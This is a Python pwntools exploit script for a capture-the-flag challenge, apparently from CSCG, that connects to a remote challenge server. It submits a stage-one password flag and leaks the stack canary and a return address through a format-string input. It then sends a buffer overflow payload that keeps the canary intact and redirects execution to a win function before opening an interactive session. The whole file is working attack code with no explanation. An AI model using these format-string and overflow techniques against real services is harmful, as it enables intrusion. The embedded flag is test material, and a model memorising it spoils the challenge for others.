#!/usr/bin/env python3

from pwn import *

PASSWORD = "CSCG{NOW_PRACTICE_MORE}"
WIN_ADDR = 0xb95
WELCOME_RET = 0xdc5

p = remote("hax1.allesctf.net", 9101)

p.recvuntil("Enter the password of stage 1:\n")
p.sendline(PASSWORD)

p.recvuntil("Enter your witch name:")
p.sendline("#%39$llu|%41$llu#")

p.recvuntil("#")
canary, ret_addr = map(int, p.recvuntil("#")[:-1].split(b"|"))

log.info(f"Leaked stack canary: {canary:#x}")
log.info(f"Leaked ret address: {ret_addr:#x}")

p.recvuntil(":")

ret_addr -= WELCOME_RET

payload = b"Expelliarmus\0".ljust(0x108)
payload += p64(canary)
payload += b"A" * 8
payload += p64(ret_addr + WIN_ADDR)

p.sendline(payload)
p.interactive()
